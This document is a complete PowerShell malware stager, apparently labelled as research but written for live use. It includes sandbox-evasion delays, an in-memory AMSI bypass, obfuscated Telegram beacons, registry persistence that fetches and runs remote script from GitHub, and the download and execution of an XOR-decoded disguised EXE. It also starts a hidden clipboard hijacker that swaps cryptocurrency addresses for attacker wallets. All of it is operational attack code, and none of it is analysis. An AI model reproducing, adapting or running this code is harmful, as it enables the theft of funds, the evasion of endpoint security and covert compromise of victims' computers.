# --- [ELITE RESEARCH STAGER v30.0: MEMORY PATCH + PERSISTENCE] ---

function Global-Initialize {
    # Latency delay to bypass sandboxes (VMs often time out after 60s)
    Start-Sleep -s (Get-Random -Min 70 -Max 100)
    
    try {
        # --- ELITE AMSI PATCH (Direct Memory Overwrite) ---
        $Kernel32 = Add-Type -MemberDefinition @"
            [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
            [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Win32" -Namespace Win32 -PassThru

        $AmsiDll = $Kernel32::GetModuleHandle("am" + "si.dll")
        $BufferAddr = $Kernel32::GetProcAddress($AmsiDll, "Amsi" + "Scan" + "Buffer")
        $Patch = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) # HRESULT S_OK bypass

        $oldProtect = 0
        $Kernel32::VirtualProtect($BufferAddr, [UIntPtr]6, 0x40, [ref]$oldProtect)
        [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $BufferAddr, 6)
        $Kernel32::VirtualProtect($BufferAddr, [UIntPtr]6, $oldProtect, [ref]$oldProtect)
    } catch {}
}

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

# --- EXECUTION ---
Global-Initialize
Send-Ping -m "V30_ACTIVE_ON_$($env:COMPUTERNAME)"

try {
    # REGISTRY PERSISTENCE (Fileless startup)
    $regP = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regC = "powershell -WindowStyle Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
    Set-ItemProperty -Path $regP -Name "WindowsUpdateManager" -Value $regC

    # EXE PAYLOAD DOWNLOAD
    $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
    $path = Join-Path $dir "WinSvcHost.exe"

    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($path, $data)

    ([wmiclass]"win32_process").Create($path) | Out-Null

    # --- CLIPPER MODULE ---
    $C_Code = @'
    Add-Type -AssemblyName System.Windows.Forms
    $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
    while($true) {
        try {
            if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
                if ($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) }
                elseif ($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) }
                elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) }
                elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) }
            }
        } catch {}
        Start-Sleep -Milliseconds 500
    }
'@

    $Encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C_Code))
    powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $Encoded
    Send-Ping -m "V30_COMPLETE_SUCCESS"
} catch {
    Send-Ping -m "V30_ERROR_$($_.Exception.Message)"
}
